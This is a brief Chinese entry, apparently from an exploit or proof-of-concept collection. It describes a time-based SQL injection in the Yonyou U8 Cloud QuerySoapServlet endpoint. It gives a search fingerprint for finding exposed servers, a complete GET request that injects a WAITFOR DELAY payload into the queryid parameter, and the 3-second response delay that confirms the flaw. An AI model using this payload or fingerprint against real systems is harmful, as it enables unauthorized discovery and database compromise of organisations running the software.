# 用友u8cloudsoap.QuerySoapServlet存在SQL注入

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`GET /service/~uapqe/nc.bs.pub.querymodel.soap.QuerySoapServlet?queryid=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--`
- **响应特征**：200 响应时间>=3s